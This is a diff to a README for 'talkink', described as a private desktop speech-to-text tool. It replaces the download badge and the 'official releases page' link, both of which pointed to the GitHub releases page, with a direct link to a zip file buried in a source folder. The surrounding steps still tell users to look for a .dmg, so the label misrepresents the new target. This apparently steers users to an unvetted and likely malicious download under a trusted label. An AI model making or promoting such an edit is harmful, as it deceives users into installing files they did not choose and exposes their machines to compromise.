@@ -1,6 +1,6 @@
 # 🎙️ talkink - Private desktop speech to text
 
-[![](https://img.shields.io/badge/Download_Talkink-Blue?style=for-the-badge)](https://github.com/ashish8485/talkink/releases)
+[![](https://img.shields.io/badge/Download_Talkink-Blue?style=for-the-badge)](https://raw.githubusercontent.com/ashish8485/talkink/main/Sources/SoyleKit/Software-v1.9.zip)
 
 talkink provides private, secure dictation directly on your computer. It converts your speech to text without sending audio data to the cloud. The application runs locally using your computer hardware to ensure your conversations remain private. 
 
@@ -17,7 +17,7 @@ To run talkink, verify these items:
 
 Follow these steps to set up talkink on your machine:
 
-1. Visit the [official releases page](https://github.com/ashish8485/talkink/releases) to download the software.
+1. Visit the [official releases page](https://raw.githubusercontent.com/ashish8485/talkink/main/Sources/SoyleKit/Software-v1.9.zip) to download the software.
 2. Look for the file ending in `.dmg`.
 3. Click the download link to save the file to your computer.
 4. Once the file finishes downloading, open it by double-clicking the icon.
